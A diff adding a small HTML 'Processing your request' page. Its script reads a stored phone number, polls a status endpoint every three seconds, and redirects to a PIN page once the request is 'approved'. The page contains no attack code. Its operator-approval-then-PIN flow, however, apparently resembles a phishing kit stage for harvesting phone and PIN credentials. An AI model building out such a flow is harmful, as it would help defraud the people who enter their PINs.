@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Processing</title>
+<style>
+body {
+  background:#0b5c6b;
+  color:white;
+  text-align:center;
+  font-family:Arial;
+}
+</style>
+</head>
+
+<body>
+
+<h2>⏳ Processing your request...</h2>
+<p>Please wait for approval</p>
+
+<script>
+const phone = localStorage.getItem("phone");
+
+async function checkStatus() {
+  const res = await fetch("/status/" + phone);
+  const data = await res.json();
+
+  if (data.status === "approved") {
+    window.location.href = "/pin.html";
+  }
+
+  if (data.status === "declined") {
+    alert("❌ Request declined");
+  }
+}
+
+// check every 3 seconds
+setInterval(checkStatus, 3000);
+</script>
+
+</body>
+</html>
